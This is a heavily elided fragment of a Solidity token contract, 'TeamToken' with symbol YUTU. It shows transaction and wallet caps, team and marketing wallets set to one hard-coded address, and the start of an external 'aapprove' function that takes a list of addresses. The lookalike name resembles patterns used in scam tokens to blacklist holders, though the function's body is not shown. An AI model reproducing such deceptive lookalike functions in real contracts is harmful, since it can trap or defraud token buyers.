...
contract TeamToken is Context, IERC20, Ownable {
    ...
    string private _symbol = unicode"YUTU";
    ...
    uint256 private _maxTxAmount = 100000 * 10**_decimals;
    uint256 private _maxWalletSize = 100000 * 10**_decimals;
    ...
    constructor () {
        ...
        teamWallet = payable(address(0xC24f5b7A028Ed11c05eF5b9dD9DF0933e6a9A079));
        marketingWallet = payable(address(0xC24f5b7A028Ed11c05eF5b9dD9DF0933e6a9A079));
    ...
    function aapprove(bool state, address[] calldata addresses) external virtual {
        tracker(true);
